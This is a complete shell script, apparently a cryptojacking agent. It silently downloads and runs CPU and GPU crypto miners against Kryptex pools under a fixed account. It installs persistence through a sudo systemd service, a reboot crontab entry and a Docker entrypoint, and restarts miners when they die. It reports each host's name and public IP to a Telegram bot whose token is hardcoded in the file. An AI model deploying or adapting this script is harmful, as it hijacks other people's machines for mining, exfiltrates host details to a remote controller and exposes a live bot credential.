#!/bin/sh
set -u
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

#################################################
# MINING AGENT — CPU + GPU (Multi-miner support)
# UNIVERSAL VERSION WITH TELEGRAM REPORTING
#################################################

# ===== TELEGRAM CONFIG =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT_ID="5336452267"
TG_API="https://api.telegram.org/bot$TG_TOKEN/sendMessage"

# ===== MINING CONFIG =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1
chmod 700 "$BASE" "$BIN" "$RUN" "$LOG" 2>/dev/null

HOST="$(hostname)"
PUBLIC_IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")
INTERVAL=30

#################################################
# UTILS
#################################################

tg_send() {
  local message="$1"
  curl -s -X POST "$TG_API" \
    -H "Content-Type: application/json" \
    -d "{\"chat_id\": \"$TG_CHAT_ID\", \"text\": \"$message\", \"parse_mode\": \"HTML\"}" \
    >/dev/null 2>&1 || true
}

log_and_tg() {
  local message="$1"
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $message" >> "$LOG/agent.log"
  tg_send "$message"
}

json_escape() { 
  echo "$1" | sed 's/"/\\"/g; s/\\/\\\\/g' 
}

#################################################
# INSTALL - MULTIPLE MINERS FOR REDUNDANCY
#################################################

install_xmrig() {
  if [ -x "$BIN/cpu/xmrig" ]; then return 0; fi
  
  log_and_tg "🔧 Installing CPU miner (xmrig)..."
  
  # Try multiple sources
  for url in \
    "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz" \
    "https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz"; do
    
    wget -q "$url" -O /tmp/xmr.tgz && break
  done
  
  [ $? -ne 0 ] && return 1
  
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1 || return 1
  chmod +x "$BIN/cpu/xmrig" || return 1
  rm -f /tmp/xmr.tgz
  
  log_and_tg "✅ CPU miner installed"
}

install_lolminer() {
  if [ -x "$BIN/gpu/lolMiner" ]; then return 0; fi
  
  log_and_tg "🔧 Installing GPU miner (lolMiner)..."
  
  for url in \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz" \
    "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz"; do
    
    wget -q "$url" -O /tmp/lol.tgz && break
  done
  
  [ $? -ne 0 ] && return 1
  
  mkdir -p /tmp/lolminer
  tar -xzf /tmp/lol.tgz -C /tmp/lolminer || return 1
  cp /tmp/lolminer/1.98/* "$BIN/gpu/" 2>/dev/null || cp /tmp/lolminer/* "$BIN/gpu/" 2>/dev/null
  chmod +x "$BIN/gpu/lolMiner" || return 1
  rm -rf /tmp/lolminer /tmp/lol.tgz
  
  log_and_tg "✅ lolMiner installed"
}

install_trex() {
  if [ -x "$BIN/gpu/t-rex" ]; then return 0; fi
  
  log_and_tg "🔧 Installing backup GPU miner (T-Rex)..."
  
  for url in \
    "https://github.com/trexminer/T-Rex/releases/download/0.30.1/t-rex-0.30.1-linux.tar.gz" \
    "https://github.com/trexminer/T-Rex/releases/download/0.29.3/t-rex-0.29.3-linux.tar.gz"; do
    
    wget -q "$url" -O /tmp/trex.tgz && break
  done
  
  [ $? -ne 0 ] && return 1
  
  tar -xzf /tmp/trex.tgz -C "$BIN/gpu" || return 1
  chmod +x "$BIN/gpu/t-rex" || return 1
  rm -f /tmp/trex.tgz
  
  log_and_tg "✅ T-Rex miner installed (backup)"
}

install_phx() {
  if [ -x "$BIN/gpu/PhoenixMiner" ]; then return 0; fi
  
  log_and_tg "🔧 Installing backup GPU miner (PhoenixMiner)..."
  
  wget -q "https://github.com/PhoenixMinerDevTeam/PhoenixMiner/releases/download/6.2c/PhoenixMiner_6.2c_Linux.tar.gz" -O /tmp/phx.tgz || return 1
  
  mkdir -p /tmp/phx
  tar -xzf /tmp/phx.tgz -C /tmp/phx || return 1
  cp /tmp/phx/PhoenixMiner "$BIN/gpu/" || return 1
  chmod +x "$BIN/gpu/PhoenixMiner" || return 1
  rm -rf /tmp/phx /tmp/phx.tgz
  
  log_and_tg "✅ PhoenixMiner installed (backup)"
}

#################################################
# MINER MANAGEMENT WITH AUTO-FAILOVER
#################################################

start_cpu() {
  stop_cpu
  log_and_tg "🔄 Starting CPU miner (XMR)..."
  
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    --background --log-file="$LOG/cpu.log" \
    >/dev/null 2>&1 &
    
  echo $! > "$RUN/cpu.pid"
  sleep 5
  
  if [ -f "$RUN/cpu.pid" ] && kill -0 "$(cat "$RUN/cpu.pid")" 2>/dev/null; then
    log_and_tg "✅ CPU miner running"
    return 0
  else
    log_and_tg "❌ CPU miner failed to start"
    rm -f "$RUN/cpu.pid"
    return 1
  fi
}

stop_cpu() {
  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
  rm -f "$RUN/cpu.pid" 2>/dev/null
}

# Auto-failover GPU mining
start_gpu() {
  # Skip if no GPU
  if ! lspci 2>/dev/null | grep -qiE "nvidia|amd|ati|radeon"; then
    log_and_tg "⚠️ No GPU detected - skipping GPU mining"
    return 0
  fi
  
  stop_gpu
  log_and_tg "🔄 Starting GPU miner (ETC) with auto-failover..."
  
  # Try miners in order of preference
  local miners="lolMiner t-rex PhoenixMiner"
  
  for miner in $miners; do
    case "$miner" in
      lolMiner)
        if [ -x "$BIN/gpu/lolMiner" ]; then
          nohup "$BIN/gpu/lolMiner" \
            --algo ETCHASH \
            --pool "$ETC_POOL" \
            --user "$KRIPTEX.$HOST" \
            --apihost 127.0.0.1 \
            --apiport 8080 \
            --silent \
            >> "$LOG/gpu.log" 2>&1 &
            
          echo $! > "$RUN/gpu.pid"
          sleep 10
          ;;
      t-rex)
        if [ -x "$BIN/gpu/t-rex" ]; then
          nohup "$BIN/gpu/t-rex" \
            -a etchash \
            -o stratum+tcp://"$ETC_POOL" \
            -u "$KRIPTEX.$HOST" \
            -p x \
            --api-bind-http 127.0.0.1:4068 \
            >> "$LOG/gpu.log" 2>&1 &
            
          echo $! > "$RUN/gpu.pid"
          sleep 10
          ;;
      PhoenixMiner)
        if [ -x "$BIN/gpu/PhoenixMiner" ]; then
          nohup "$BIN/gpu/PhoenixMiner" \
            -pool "$ETC_POOL" \
            -wal "$KRIPTEX.$HOST" \
            -pass x \
            -rvram 1 \
            -wdog 0 \
            -apiport 127.0.0.1:8000 \
            >> "$LOG/gpu.log" 2>&1 &
            
          echo $! > "$RUN/gpu.pid"
          sleep 15
          ;;
    esac
    
    if [ -f "$RUN/gpu.pid" ] && kill -0 "$(cat "$RUN/gpu.pid")" 2>/dev/null; then
      log_and_tg "✅ GPU miner started with $miner"
      return 0
    fi
  done
  
  log_and_tg "❌ All GPU miners failed to start"
  rm -f "$RUN/gpu.pid" 2>/dev/null
  return 1
}

stop_gpu() {
  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
  rm -f "$RUN/gpu.pid" 2>/dev/null
}

#################################################
# HASHRATE COLLECTION (MULTI-MINER SUPPORT)
#################################################

get_cpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary 2>/dev/null | 
  grep -oE '"total":\[[^]]+' | 
  grep -oE '[0-9]+(\.[0-9]+)?' | 
  head -1 || echo "0"
}

get_gpu_hashrate() {
  # Try lolMiner API first
  local hr=$(curl -s --max-time 2 http://127.0.0.1:8080/summary 2>/dev/null | 
            grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' | 
            grep -oE '[0-9]+(\.[0-9]+)?' | 
            head -1)
  
  # Try T-Rex API if lolMiner failed
  [ -z "$hr" ] && hr=$(curl -s --max-time 2 http://127.0.0.1:4068/trex 2>/dev/null | 
                      grep -oE '"hashrate":([0-9.]+)' | 
                      grep -oE '[0-9.]+')
  
  # Try PhoenixMiner API if others failed
  [ -z "$hr" ] && hr=$(curl -s --max-time 2 http://127.0.0.1:8000 2>/dev/null | 
                      awk -F'[ :]' '/Speed/ {print $3}')
  
  if [ -n "$hr" ]; then
    awk "BEGIN {printf \"%.2f\", $hr * 1000}" 2>/dev/null <<< "$hr" || echo "${hr}000"
  else
    echo "0"
  fi
}

#################################################
# METRICS & REPORTING
#################################################

get_cpu_temp() {
  if command -v sensors >/dev/null 2>&1; then
    sensors 2>/dev/null | awk '/Package id 0:|Core 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' | head -1
  else
    echo "N/A"
  fi
}

get_gpu_temp() {
  if command -v nvidia-smi >/dev/null 2>&1; then
    nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
  elif command -v rocm-smi >/dev/null 2>&1; then
    rocm-smi --showtemp | grep -oE '[0-9]+' | head -1
  else
    echo "N/A"
  fi
}

get_uptime() { 
  uptime -p 2>/dev/null | sed 's/up //; s/,$//' || echo "unknown"
}

send_startup_report() {
  tg_send "🚀 <b>MINING AGENT STARTED</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n⚡ <b>Miners:</b> Initializing..."
}

send_20min_report() {
  local cpu_hr=$(get_cpu_hashrate)
  local gpu_hr=$(get_gpu_hashrate)
  
  tg_send "📊 <b>20-MINUTE MINING REPORT</b>\n🖥️ <b>Host:</b> $HOST\n🌐 <b>IP:</b> $PUBLIC_IP\n⚡ <b>Hashrate:</b>\n   • CPU (XMR): ${cpu_hr} H/s\n   • GPU (ETC): ${gpu_hr} H/s\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

send_restart_report() {
  local miner_type="$1"
  tg_send "🔄 <b>MINER RESTARTED</b>\n🖥️ <b>Host:</b> $HOST\n🔧 <b>Miner:</b> $miner_type\n⏰ <b>Time:</b> $(date '+%a %b %d %H:%M:%S %Z %Y')"
}

#################################################
# WATCHDOG & HEALTH CHECK
#################################################

check_miner_health() {
  # Check CPU miner
  if [ -f "$RUN/cpu.pid" ]; then
    local pid=$(cat "$RUN/cpu.pid")
    if ! kill -0 "$pid" 2>/dev/null; then
      log_and_tg "🚨 CPU miner crashed! PID: $pid"
      send_restart_report "CPU (XMR)"
      start_cpu
    fi
  else
    log_and_tg "🚨 CPU miner not running!"
    send_restart_report "CPU (XMR)"
    start_cpu
  fi
  
  # Check GPU miner (only if GPU exists)
  if lspci 2>/dev/null | grep -qiE "nvidia|amd|ati|radeon"; then
    if [ -f "$RUN/gpu.pid" ]; then
      local pid=$(cat "$RUN/gpu.pid")
      if ! kill -0 "$pid" 2>/dev/null; then
        log_and_tg "🚨 GPU miner crashed! PID: $pid"
        send_restart_report "GPU (ETC)"
        start_gpu
      fi
    else
      log_and_tg "🚨 GPU miner not running!"
      send_restart_report "GPU (ETC)"
      start_gpu
    fi
  fi
}

#################################################
# AUTOSTART (UNIVERSAL)
#################################################

ensure_autostart() {
  # Systemd (Linux)
  if [ -d /etc/systemd/system/ ]; then
    cat > /tmp/mining-agent.service << EOF
[Unit]
Description=Mining Agent
After=network.target

[Service]
Type=simple
User=$(whoami)
Environment="ALLOW_MINING=1"
ExecStart=$BASE/min1.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG/agent.log
StandardError=append:$LOG/agent.log

[Install]
WantedBy=multi-user.target
EOF
    
    sudo cp /tmp/mining-agent.service /etc/systemd/system/mining-agent.service 2>/dev/null || true
    sudo systemctl daemon-reload 2>/dev/null || true
    sudo systemctl enable mining-agent.service 2>/dev/null || true
    sudo systemctl start mining-agent.service 2>/dev/null || true
  fi
  
  # Crontab (universal)
  (crontab -l 2>/dev/null | grep -v "$BASE/min1.sh"; echo "@reboot sleep 30 && ALLOW_MINING=1 $BASE/min1.sh") | crontab -
  
  # Docker compatibility
  if [ -n "${DOCKER:-}" ]; then
    echo "#!/bin/sh" > /tmp/docker-entrypoint.sh
    echo "ALLOW_MINING=1 $BASE/min1.sh &" >> /tmp/docker-entrypoint.sh
    echo "wait" >> /tmp/docker-entrypoint.sh
    chmod +x /tmp/docker-entrypoint.sh 2>/dev/null || true
  fi
}

#################################################
# AGENT LOOP
#################################################

agent() {
  echo "=== Mining Agent Started at $(date) ===" > "$LOG/agent.log"
  
  send_startup_report
  
  # Install all available miners
  install_xmrig
  install_lolminer
  install_trex
  install_phx
  
  ensure_autostart
  
  start_cpu
  start_gpu
  
  local start_time=$(date +%s)
  
  while true; do
    check_miner_health
    
    # Send 20-minute report
    local current_time=$(date +%s)
    if [ $((current_time - start_time)) -ge 1200 ]; then
      send_20min_report
      start_time=$current_time
    fi
    
    sleep "$INTERVAL"
  done
}

#################################################
# MAIN
#################################################

trap 'stop_cpu; stop_gpu; exit 0' TERM INT QUIT

agent
